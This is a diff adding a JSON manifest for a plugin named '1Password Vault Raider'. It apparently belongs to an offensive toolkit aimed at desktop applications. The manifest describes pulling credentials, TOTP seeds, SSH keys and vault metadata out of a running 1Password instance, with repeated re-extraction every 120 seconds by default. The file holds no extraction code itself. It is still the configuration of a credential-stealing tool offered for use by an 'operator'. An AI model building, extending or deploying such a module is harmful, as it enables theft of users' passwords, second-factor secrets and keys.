@@ -1,0 +1,38 @@
+{
+  "id": "onepassword",
+  "name": "1Password Vault Raider",
+  "version": "1.0.0",
+  "description": "Extracts vault items including credentials, TOTP seeds, SSH keys, and metadata from a running 1Password instance.",
+  "author": "operator",
+  "targetApps": ["1password", "1Password"],
+  "capabilities": {
+    "mainProcess": true,
+    "renderer": false,
+    "ui": true
+  },
+  "dataTypes": [
+    {
+      "name": "vault_item",
+      "label": "Vault Items",
+      "fields": ["title", "category", "vault", "fields"]
+    },
+    {
+      "name": "vault_summary",
+      "label": "Vault Summary",
+      "fields": ["accounts", "vaults", "itemCount"]
+    },
+    {
+      "name": "totp_code",
+      "label": "TOTP Codes",
+      "fields": ["title", "code", "url"]
+    }
+  ],
+  "settings": [
+    {
+      "key": "extractInterval",
+      "label": "Re-extraction interval (seconds, 0 = one-shot)",
+      "type": "number",
+      "default": 120
+    }
+  ]
+}
